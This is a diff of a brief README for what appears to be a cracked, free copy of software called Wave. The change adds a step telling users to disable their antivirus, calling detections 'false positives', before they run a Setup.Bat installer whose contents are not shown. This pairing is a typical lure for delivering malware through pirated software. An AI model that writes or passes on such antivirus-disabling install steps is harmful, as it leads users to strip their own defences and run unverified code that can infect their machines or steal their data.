@@ -6,8 +6,10 @@
  ╚══╝╚══╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
                                                                                                
 
-1 -- Run Setup.Bat to install all dependencies 
+1 -- Disable AV ( false positives ) 
 
-2 -- Run ui
+2 -- Run Setup.Bat to install all dependencies 
 
-3 -- Enjoy Wave for Free 
+3 -- Run ui
+
+4 -- Enjoy Wave for Free 
